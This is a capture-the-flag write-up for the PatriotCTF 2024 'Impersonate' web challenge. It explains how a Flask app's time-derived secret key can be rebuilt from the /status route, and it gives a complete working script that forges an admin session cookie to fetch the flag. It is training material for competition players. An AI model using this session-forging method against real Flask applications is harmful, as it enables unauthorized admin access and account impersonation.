# Patriot CTF 2024 Writeup: **Impersonate**

**Category:** Web   
**Writeup Author:** `supasuge`
`CTF`: PatriotCTF2024
Analyzing the Source Code

Source code is pretty straight forward.
- `app.py`:
### Key Components:

1. **Session Management:**
   - **Secret Key Generation:**
```python
server_start_time = datetime.now()
server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
app.secret_key = secure_key
```
The secret key is derived from the server's start time, formatted as `YYYYMMDDHHMMSS`.

   - **Session Lifetime:**
```python
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(seconds=300)
```

2. **User Authentication:**
   - **User Registration:**
     Users submit a `username` and `password`. The application validates the username and password, ensuring the username is alphanumeric and less than 20 characters.

   - **UUID Generation:**
```python
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
uid = uuid.uuid5(secret, username)
```
A UUID is generated using UUIDv5 with a fixed namespace `secret`.

3. **Admin Page Access:**
```python
@app.route('/admin')
def admin_page():
    if session.get('is_admin') and uuid.uuid5(secret, 'administrator') and session.get('username') == 'administrator':
        return flag
    else:
        abort(401)
```
To access the admin page and retrieve the flag, the session must have `is_admin` set to `True`, and the `username` must be `'administrator'`.

4. **Status Route:**
```python
@app.route('/status')
def status():
    current_time = datetime.now()
    uptime = current_time - server_start_time
    formatted_uptime = str(uptime).split('.')[0]
    formatted_current_time = current_time.strftime('%Y-%m-%d %H:%M:%S')
    status_content = f"""Server uptime: {formatted_uptime}<br>
    Server time: {formatted_current_time}
       """
    return status_content
```
   The `/status` route reveals the server's uptime and current time, which can be leveraged to deduce the `server_start_time`.
### To get flag
1. **Retrieve Server Status:**
   - Access the `/status` route to obtain the server's current time and uptime.
   - Calculate the server's start time by subtracting the uptime from the current time.

2. **Reconstruct the Secret Key:**
   - Use the server's start time to generate the same `secure_key` by hashing `secret_key_<server_start_str>` with SHA-256.

3. **Forge the Session Cookie:**
   - With the `secure_key`, serialize a session containing `username: administrator`, `uid: <UUID of administrator>`, and `is_admin: True`.
   - Generate a signed session cookie that the server will accept using the reconstructed key.

4. **Access the Admin Page:**
   - Use the forged session cookie to make a request to `/admin`.
   - If successful, the server returns the flag.

---

## Solution script

The exploit is implemented in the provided `solve.py`. 

Breakdown of each step in case ur still confused ig: 

### Step 1: Retrieve Server Status

```python
def get_server_status():
    status_url = f'{base_url}/status'
    response = requests.get(status_url)

    if response.status_code != 200:
        print('Failed to retrieve server status')
        exit()

    # Parse server time and uptime from the response
    soup = BeautifulSoup(response.text, 'html.parser')
    text = soup.get_text()

    # Extract uptime and current time
    uptime_match = re.search(r'Server uptime: ([\d:]+)', text)
    current_time_match = re.search(r'Server time: (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})', text)

    if not uptime_match or not current_time_match:
        print('Failed to parse server status')
        exit()

    uptime_str = uptime_match.group(1)
    current_time_str = current_time_match.group(1)

    # Convert uptime to timedelta
    time_parts = uptime_str.split(':')
    if len(time_parts) == 3:
        hours, minutes, seconds = map(int, time_parts)
        uptime = timedelta(hours=hours, minutes=minutes, seconds=seconds)
    elif len(time_parts) == 2:
        minutes, seconds = map(int, time_parts)
        uptime = timedelta(minutes=minutes, seconds=seconds)
    else:
        print('Unexpected uptime format')
        exit()

    # Convert current time string to datetime
    current_time = datetime.strptime(current_time_str, '%Y-%m-%d %H:%M:%S')

    # Calculate server start time
    server_start_time = current_time - uptime
    server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')

    return server_start_str
```
- sends a GET request to `/status` and parses the response to extract `server uptime` and `server time`.
- It calculates the `server_start_time` by subtracting `uptime` from `current_time`.
- Formats the `server_start_time` to match the secret key generation pattern.

### Step 2: Reconstruct the Secret Key

```python
def get_secure_key(server_start_str):
    secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
    return secure_key
```

- Uses the derived `server_start_str` to reconstruct the `secure_key` by hashing the string `secret_key_<server_start_str>` with SHA-256.

### Step 3: Forge the Session Cookie

```python
def forge_session_cookie(secure_key):
    app = Flask(__name__)
    app.secret_key = secure_key

    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

    # The secret UUID used in the application
    secret_uuid = uuid.UUID('31333337-1337-1337-1337-133713371337')
    admin_uid = str(uuid.uuid5(secret_uuid, 'administrator'))

    session_data = {
        'username': 'administrator',
        'uid': admin_uid,
        'is_admin': True
    }

    session_cookie = session_serializer.dumps(session_data)
    return session_cookie
```

- Initializes a Flask app instance with the reconstructed `secure_key`.
- Utilizes Flask's `SecureCookieSessionInterface` to serialize the session data.
- Sets `username` to `'administrator'`, calculates the corresponding `uid` using UUIDv5 with the known `secret_uuid`, and sets `is_admin` to `True`.
- Generates a forged signed session cookie that mimics a valid admin session.

### Step 4: Access the Admin Route with the Forged Session

```python
def get_flag(session_cookie):
    cookies = {
        'session': session_cookie
    }

    admin_url = f'{base_url}/admin'
    admin_response = requests.get(admin_url, cookies=cookies)

    if admin_response.status_code == 200:
        print('Flag:', admin_response.text)
    else:
        print('Failed to retrieve flag, status code:', admin_response.status_code)
        print('Response:', admin_response.text)
```
- Sends a GET request to `/admin` with the forged session cookie.
- If successful, the server responds with the flag.

### Complete Exploit Script

Full script:

```python
#!/usr/bin/env python3

import requests
from datetime import datetime, timedelta
import hashlib
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import uuid
import re
from bs4 import BeautifulSoup

# Target server URL
base_url = 'http://chal.competitivecyber.club:9999'

# Step 1: Retrieve server status
def get_server_status():
    status_url = f'{base_url}/status'
    response = requests.get(status_url)

    if response.status_code != 200:
        print('Failed to retrieve server status')
        exit()

    # Parse server time and uptime from the response
    soup = BeautifulSoup(response.text, 'html.parser')
    text = soup.get_text()

    # Extract uptime and current time
    uptime_match = re.search(r'Server uptime: ([\d:]+)', text)
    current_time_match = re.search(r'Server time: (\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})', text)

    if not uptime_match or not current_time_match:
        print('Failed to parse server status')
        exit()

    uptime_str = uptime_match.group(1)
    current_time_str = current_time_match.group(1)

    # Convert uptime to timedelta
    time_parts = uptime_str.split(':')
    if len(time_parts) == 3:
        hours, minutes, seconds = map(int, time_parts)
        uptime = timedelta(hours=hours, minutes=minutes, seconds=seconds)
    elif len(time_parts) == 2:
        minutes, seconds = map(int, time_parts)
        uptime = timedelta(minutes=minutes, seconds=seconds)
    else:
        print('Unexpected uptime format')
        exit()

    # Convert current time string to datetime
    current_time = datetime.strptime(current_time_str, '%Y-%m-%d %H:%M:%S')

    # Calculate server start time
    server_start_time = current_time - uptime
    server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')

    return server_start_str

# Step 2: Reconstruct the secret key
def get_secure_key(server_start_str):
    secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
    return secure_key

# Step 3: Forge session data
def forge_session_cookie(secure_key):
    app = Flask(__name__)
    app.secret_key = secure_key

    session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

    # The secret UUID used in the application
    secret_uuid = uuid.UUID('31333337-1337-1337-1337-133713371337')
    admin_uid = str(uuid.uuid5(secret_uuid, 'administrator'))

    session_data = {
        'username': 'administrator',
        'uid': admin_uid,
        'is_admin': True
    }

    session_cookie = session_serializer.dumps(session_data)
    return session_cookie

# Step 4: Access the admin route with the forged session
def get_flag(session_cookie):
    cookies = {
        'session': session_cookie
    }

    admin_url = f'{base_url}/admin'
    admin_response = requests.get(admin_url, cookies=cookies)

    if admin_response.status_code == 200:
        print('Flag:', admin_response.text)
    else:
        print('Failed to retrieve flag, status code:', admin_response.status_code)
        print('Response:', admin_response.text)

if __name__ == '__main__':
    print('[*] Retrieving server status...')
    server_start_str = get_server_status()
    print('[*] Server start time string:', server_start_str)

    print('[*] Reconstructing secure key...')
    secure_key = get_secure_key(server_start_str)
    print('[*] Secure key obtained.')

    print('[*] Forging session cookie...')
    session_cookie = forge_session_cookie(secure_key)
    print('[*] Session cookie forged.')

    print('[*] Attempting to retrieve the flag...')
    get_flag(session_cookie)
```

**Usage:**

1. Ensure the required Python packages are installed:
   ```bash
   pip install requests flask beautifulsoup4
   ```

2. Run the exploit script:
   ```bash
   python solve.py
   ```

**Expected Output:**

```
[*] Retrieving server status...
[*] Server start time string: 20230922123456
[*] Reconstructing secure key...
[*] Secure key obtained.
[*] Forging session cookie...
[*] Session cookie forged.
[*] Attempting to retrieve the flag...
Flag: pctf{......}
```
